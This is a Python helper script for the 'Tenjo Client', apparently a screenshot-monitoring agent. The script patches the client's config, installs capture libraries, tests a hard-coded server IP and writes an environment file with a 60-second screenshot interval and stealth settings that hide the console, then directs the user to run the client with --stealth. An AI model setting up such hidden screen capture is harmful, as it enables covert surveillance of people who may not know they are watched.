#!/usr/bin/env python3
"""
Production Fix Script for Tenjo Client
Fixes common production issues and validates setup
"""

import os
import sys
import json
import logging
from datetime import datetime

def setup_logging():
    """Setup logging"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler('production_fix.log')
        ]
    )

def fix_config_issues():
    """Fix configuration issues"""
    print("🔧 Fixing Configuration Issues...")
    
    config_file = os.path.join('src', 'core', 'config.py')
    
    if not os.path.exists(config_file):
        print("❌ Config file not found!")
        return False
    
    try:
        # Read current config
        with open(config_file, 'r') as f:
            content = f.read()
        
        # Check for common issues
        fixes_applied = []
        
        # Fix 1: Ensure server URL is configurable
        if 'os.getenv(' not in content:
            content = content.replace(
                'SERVER_URL = "http://103.129.149.67"',
                'SERVER_URL = os.getenv(\'TENJO_SERVER_URL\', "http://103.129.149.67")'
            )
            fixes_applied.append("Made server URL configurable via environment variable")
        
        # Fix 2: Add import os if missing
        if 'import os' not in content:
            content = 'import os\n' + content
            fixes_applied.append("Added missing 'import os'")
        
        # Write back if changes made
        if fixes_applied:
            with open(config_file, 'w') as f:
                f.write(content)
            
            for fix in fixes_applied:
                print(f"✅ {fix}")
        else:
            print("✅ Configuration is already correct")
        
        return True
        
    except Exception as e:
        print(f"❌ Error fixing config: {e}")
        return False

def fix_api_client_issues():
    """Fix API client issues"""
    print("\n🔧 Fixing API Client Issues...")
    
    api_file = os.path.join('src', 'utils', 'api_client.py')
    
    if not os.path.exists(api_file):
        print("❌ API client file not found!")
        return False
    
    try:
        with open(api_file, 'r') as f:
            content = f.read()
        
        fixes_applied = []
        
        # Fix 1: Improve error handling in upload_screenshot
        if 'logging.debug(f"Uploading screenshot' not in content:
            # Add debug logging for screenshot uploads
            old_line = 'logging.info("Uploading screenshot to production server...")'
            new_line = '''logging.info("Uploading screenshot to production server...")
                logging.debug(f"Screenshot data length: {len(image_data)} chars")
                logging.debug(f"Metadata: {metadata}")'''
            
            if old_line in content:
                content = content.replace(old_line, new_line)
                fixes_applied.append("Added debug logging for screenshot uploads")
        
        # Fix 2: Improve registration error handling
        if 'logging.debug(f"Registration data:' not in content:
            old_line = 'logging.info(f"Registering client with production server: {self.server_url}")'
            new_line = '''logging.info(f"Registering client with production server: {self.server_url}")
                logging.debug(f"Registration data: {production_data}")'''
            
            if old_line in content:
                content = content.replace(old_line, new_line)
                fixes_applied.append("Added debug logging for client registration")
        
        if fixes_applied:
            with open(api_file, 'w') as f:
                f.write(content)
            
            for fix in fixes_applied:
                print(f"✅ {fix}")
        else:
            print("✅ API client is already correct")
        
        return True
        
    except Exception as e:
        print(f"❌ Error fixing API client: {e}")
        return False

def validate_dependencies():
    """Validate required dependencies"""
    print("\n🔍 Validating Dependencies...")
    
    required_packages = [
        'requests',
        'mss', 
        'psutil',
        'PIL'
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"✅ {package} - Available")
        except ImportError:
            print(f"❌ {package} - Missing")
            missing_packages.append(package)
    
    if missing_packages:
        print(f"\n📦 Installing missing packages: {', '.join(missing_packages)}")
        
        import subprocess
        for package in missing_packages:
            try:
                # Map package names
                install_name = package
                if package == 'PIL':
                    install_name = 'pillow'
                
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--user', install_name], 
                             check=True, capture_output=True)
                print(f"✅ Installed {package}")
            except subprocess.CalledProcessError as e:
                print(f"❌ Failed to install {package}: {e}")
                return False
    
    return True

def create_production_env():
    """Create production environment file"""
    print("\n📝 Creating Production Environment...")
    
    env_content = f"""# Tenjo Client Production Environment
# Generated: {datetime.now().isoformat()}

# Server Configuration
TENJO_SERVER_URL=http://103.129.149.67
TENJO_API_KEY={Config.CLIENT_ID if 'Config' in globals() else 'auto-generated'}

# Monitoring Settings
TENJO_SCREENSHOT_INTERVAL=60
TENJO_LOG_LEVEL=WARNING

# Stealth Settings
TENJO_STEALTH_MODE=true
TENJO_HIDE_CONSOLE=true
"""
    
    try:
        with open('.env', 'w') as f:
            f.write(env_content)
        
        print("✅ Production environment file created")
        return True
        
    except Exception as e:
        print(f"❌ Error creating environment file: {e}")
        return False

def test_production_connection():
    """Test connection to production server"""
    print("\n🌐 Testing Production Connection...")
    
    try:
        # Add src to path
        sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))
        
        from core.config import Config
        from utils.api_client import APIClient
        
        api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)
        
        print(f"🎯 Testing connection to: {Config.SERVER_URL}")
        
        # Test health endpoint
        response = api_client.get('/api/health')
        
        if response:
            print("✅ Production server is reachable")
            print(f"📝 Health response: {response}")
            return True
        else:
            print("❌ Production server not responding")
            return False
            
    except Exception as e:
        print(f"❌ Connection test failed: {e}")
        return False

def main():
    """Run production fixes"""
    setup_logging()
    
    print("🚀 Tenjo Production Fix Script")
    print("=" * 50)
    print(f"⏰ Fix Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 50)
    
    fixes = [
        ("Configuration Issues", fix_config_issues),
        ("API Client Issues", fix_api_client_issues),
        ("Dependencies", validate_dependencies),
        ("Production Environment", create_production_env),
        ("Production Connection", test_production_connection)
    ]
    
    results = []
    
    for fix_name, fix_func in fixes:
        try:
            success = fix_func()
            results.append((fix_name, success))
        except Exception as e:
            print(f"❌ Fix '{fix_name}' crashed: {str(e)}")
            results.append((fix_name, False))
    
    # Summary
    print("\n" + "=" * 50)
    print("📊 PRODUCTION FIX SUMMARY")
    print("=" * 50)
    
    passed = 0
    total = len(results)
    
    for fix_name, success in results:
        status = "✅ FIXED" if success else "❌ FAILED"
        print(f"{status} - {fix_name}")
        if success:
            passed += 1
    
    print("-" * 50)
    print(f"📈 Results: {passed}/{total} fixes applied successfully")
    
    if passed == total:
        print("\n🎉 ALL FIXES APPLIED! Production setup should now work correctly.")
        print("\n📋 Next Steps:")
        print("1. Run: python production_test.py")
        print("2. Run: python main.py --stealth")
        print("3. Check dashboard for client registration")
        return 0
    else:
        print("\n⚠️  SOME FIXES FAILED! Manual intervention may be required.")
        return 1

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)